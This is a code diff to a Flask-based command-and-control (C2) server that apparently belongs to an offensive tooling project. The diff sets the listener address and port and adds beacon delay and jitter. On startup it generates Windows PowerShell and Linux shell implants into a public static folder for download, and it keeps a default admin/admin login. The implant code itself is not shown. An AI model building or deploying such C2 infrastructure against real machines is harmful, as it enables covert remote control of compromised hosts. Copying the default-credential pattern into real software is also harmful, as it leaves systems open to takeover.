@@ -1,15 +1,24 @@
 from flask import Flask, render_template, request, redirect, url_for, session, flash, jsonify
 import os
-import users
 import socket
 import threading
 import queue
 import readline
 import logging
 
-# C2 Server IP and port configuration
-SERVER_HOST = "0.0.0.0"
+# Custom imports
+import users
+import implants
+
+# IP and port configs
+SERVER_HOST = "192.168.108.15"
 SERVER_PORT = 4444
+FLASK_HOST = "192.168.108.15"
+FLASK_PORT = 5000
+
+# C2 configs
+DELAY = 10
+JITTER = 2
 
 # Flask stuff
 app = Flask(__name__)
@@ -222,12 +231,19 @@ if __name__ == '__main__':
     if not os.path.exists("creds.db"):
         users.register("admin", "admin")
 
+    # Prepare implants in static/
+    ps = implants.win(SERVER_HOST, SERVER_PORT, DELAY, JITTER)
+    with open("static/win.ps1", 'w') as file:
+        file.write(ps)
+    bash = implants.lin(SERVER_HOST, SERVER_PORT, DELAY, JITTER)
+    with open("static/lin.sh", 'w') as file:
+        file.write(bash)
+
     # Run C2 Server in separate thread
     server_thread = threading.Thread(target=start_server)
     server_thread.daemon = True
     server_thread.start()
 
     # Run Flask in main thread
-    logger.info("[+] Starting Flask app on 0.0.0.0:5000")
-    app.run(host='0.0.0.0', port=5000)
-
+    logger.info(f"[+] Starting Flask app on {FLASK_HOST}:{FLASK_PORT}")
+    app.run(host=FLASK_HOST, port=FLASK_PORT)
